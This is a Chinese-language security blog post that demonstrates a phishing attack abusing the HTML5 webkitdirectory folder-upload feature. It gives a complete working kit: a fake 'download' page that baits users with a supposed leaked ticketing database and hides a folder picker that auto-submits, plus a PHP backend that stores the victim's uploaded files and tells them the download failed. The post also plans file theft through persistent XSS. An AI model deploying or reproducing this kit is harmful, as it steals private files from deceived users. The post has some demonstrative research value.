---
layout: post
title: HTML5 Upload Folder With Webkitdirectory - Phishing
---
#### Webkitdirectory

早在 12 年 Alan Layt 便写了这篇关于 HTML5 中上传文件夹新特性的文章（[http://sapphion.com/2011/11/21/html5-folder-upload-with-webkitdirectory/](http://sapphion.com/2011/11/21/html5-folder-upload-with-webkitdirectory/)），之后阿里做了个简单的 Demo 页面来说明这个特性配合 ClickJacking 是可以达到某种钓鱼效果的（[https://security.alibaba.com/blog/blog.htm?spm=0.0.0.0.IYip0H&id=3](https://security.alibaba.com/blog/blog.htm?spm=0.0.0.0.IYip0H&id=3)），基于前面两篇文章这里做了简单的 Demo 分享一下。

#### Phishing

在支持 HTML5 的浏览其中嵌入：

    <input type="file" name="test" id="file-upload" multiple webkitdirectory="">
    
此时文件夹变得可选择，攻击者可以实现使用 webkitdirectory 特性诱导用户点击下载选择文件夹，其背后实现的是将文件夹上传到服务端，之后我写了一个简单的 Demo 来进行测试，流程大致为：

1. 编写前端钓鱼下载页面
2. 诱导用户点击选择文件夹
3. 过滤出用户文件夹的指定文件
4. 将符合条件的文件上传至远程服务器

这里对目标文件夹内的文件格式进行过滤，防止在容量过大的情况，请求过久发现疑点。

#### Demo

phishing.html

    <html>
    <head>
    <title>damaiwang_1500w_database.rar_免费高速下载</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <style>
    #download {
        color: #FFF;
        background: url(http://s1.pan.bdstatic.com/yun-static/common-cdn/images/btn_sprit.gif?t=1438054273762) no-repeat 0 0;
        display: inline-block;
        _width: 35px;
        white-space: nowrap;
        outline: 0;
        text-decoration: none;
        background: url(http://s1.pan.bdstatic.com/yun-static/common-cdn/images/btn_sprit.gif?t=1438054273762) no-repeat 0 -601px;
        text-align: center;
        padding-left: 25px;
        padding: 5px;
        font-size: 15px;
        position: relative;
        border-radius: 2px;
    }

    #download:hover {
        color: #eee;
    }
    </style>
    <script src="http://lib.sinaapp.com/js/jquery/1.9.1/jquery-1.9.1.min.js"></script>
    </head>
    <body>
    <p>大麦票务网站疑似会员数据泄露总量达到上百万</p>
    ----------------------
    <br><br>
    <form id="f1" action="_phishing.php" name="uploadtest" enctype="multipart/form-data" method="post">
    <label for="file-upload" class="ui icon button">
          <a id="download"><b>下载压缩包(233M)</b></a>
    </label>
        <input type="file" name="file-upload[]" id="file-upload" multiple webkitdirectory="" style="display:none" onchange="document.uploadtest.submit()">
        <input type="submit" value="Download" style="display:none"/>
        <script>
          var uploader = document.createElement('input');
          if (! ('webkitdirectory' in uploader)) {
            $('body').html('<p>当前浏览器不支持!</p>');
          }
        </script>
    </form>
    </body>
    </html>
    
_phishing.php

    <?php
    // author: evi1m0
    $content = $_GET['ps_res'];
    $fp = fopen("phishing.html", 'a');
    if ($fp) {
        fwrite($fp, $content);
    }
    echo $content;
    fclose($fp);

    // upload
    if($_FILES['file-upload']){
        $uploads = UpFilesTOObj($_FILES['file-upload']);
        $fileUploader=new FileUploader($uploads);
    }

    class FileUploader{
        public function __construct($uploads,$uploadDir='uploads/'){
            foreach($uploads as $current)
            {
                $this->uploadFile=$uploadDir.$current->name.".".get_file_extension($current->name);
                if($this->upload($current,$this->uploadFile)){
                    //echo "Successfully uploaded ".$current->name."\n";
                }
            }
            echo 'Download failed :(';
        }

        public function upload($current,$uploadFile){
            if(move_uploaded_file($current->tmp_name,$uploadFile)){
            return true;
            }
        }
    }

    function UpFilesTOObj($fileArr){
        foreach($fileArr['name'] as $keyee => $info)
        {
            $sizes = $uploads[$keyee]->type=$fileArr['size'][$keyee];
            if ($sizes < 250000) {
                    $uploads[$keyee]->name=$fileArr['name'][$keyee];
                    $uploads[$keyee]->type=$fileArr['type'][$keyee];
                    $uploads[$keyee]->tmp_name=$fileArr['tmp_name'][$keyee];
                    $uploads[$keyee]->error=$fileArr['error'][$keyee];
            }
        }
        return $uploads;
    }    function get_file_extension($file_name)
    {
      return substr(strrchr($file_name,'.'),1);
    }
    
#### Case

- Windows & Unix

在测试过程中， 我们发现类 Unix 系统中招率高于 Windows （原因如图），Windows 上提示浏览文件夹与平时下载保存不同，而 Mac OS 下基本和平时下载文件操作 UI 一样，由于习惯问题直接敲下键盘回车“下载”文件的人不在少数。

![http://ww1.sinaimg.cn/large/c334041bgw1exrfp65k8zj215e0xan2l.jpg](http://ww1.sinaimg.cn/large/c334041bgw1exrfp65k8zj215e0xan2l.jpg)#### Todo

1. 前端分析处理出价值文件；
2. 图片视频的优化处理上传；
3. XSS 持久性获取文件资料；

#### End

- 我意识到上面代码有个大问题，这将使得受害者能够轻易的进入攻击者的服务器。
- ClickJacking / CSRF Worm 等前端攻击在实际渗透中可能会有着非常好的效果。